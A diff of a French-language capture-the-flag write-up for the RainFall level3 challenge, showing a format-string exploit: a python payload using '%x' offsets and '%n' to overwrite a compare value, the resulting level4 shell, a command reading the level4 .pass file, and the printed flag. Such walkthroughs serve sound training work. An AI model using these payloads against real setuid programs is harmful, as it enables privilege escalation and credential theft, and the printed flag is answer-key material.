@@ -17,6 +17,7 @@ https://resources.infosecinstitute.com/topic/buffer-overflow-format-string-attac
 0x080484df <+59>:	cmp    $0x40,%eax
 
 0x804988c -> Adresse de comparaison avec 0x40
+
 "%x" * 3 -> offset vers la stack du printf
 "%n" -> force le printf a ecrire le nombre de caractere affiche precedemment a l'adresse cible
 
@@ -37,6 +38,5 @@ level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "\x40" * 41 + "%x"*3 + 
 Wait what?!
 id
 uid=2022(level3) gid=2022(level3) euid=2025(level4) egid=100(users) groups=2025(level4),100(users),2022(level3)
-cd /home/user/level4
-pwd
-/home/user/level4
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
